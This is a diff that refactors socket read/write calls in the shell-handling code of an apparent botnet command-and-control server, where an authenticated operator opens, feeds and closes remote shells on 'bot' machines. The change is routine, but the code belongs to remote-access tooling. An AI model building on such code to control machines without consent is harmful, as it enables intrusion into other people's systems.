@@ -65,8 +65,8 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
         LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer isn't a bot!\n");
 
     /* read term size */
-    laikaS_readInt(&authPeer->sock, &cols, sizeof(uint16_t));
-    laikaS_readInt(&authPeer->sock, &rows, sizeof(uint16_t));
+    cols = laikaS_readu16(&authPeer->sock);
+    rows = laikaS_readu16(&authPeer->sock);
 
     /* open shell */
     laikaC_openShell(peer, authPeer, cols, rows);
@@ -80,7 +80,7 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
     struct sLaika_shellInfo *shell;
     uint32_t id;
 
-    laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
+    id = laikaS_readu32(&authPeer->sock);
 
     /* ignore malformed packet */
     if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
@@ -102,7 +102,7 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
     if (sz - sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH)
         LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Wrong data size!\n");
 
-    laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
+    id = laikaS_readu32(&authPeer->sock);
     sz -= sizeof(uint32_t);
 
     /* ignore malformed packet */
@@ -116,7 +116,7 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
 
     /* forward to peer */
     laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-    laikaS_writeInt(&peer->sock, &shell->botShellID, sizeof(uint32_t));
+    laikaS_writeu32(&peer->sock, shell->botShellID);
     laikaS_write(&peer->sock, data, sz);
     laikaS_endVarPacket(peer);
 }
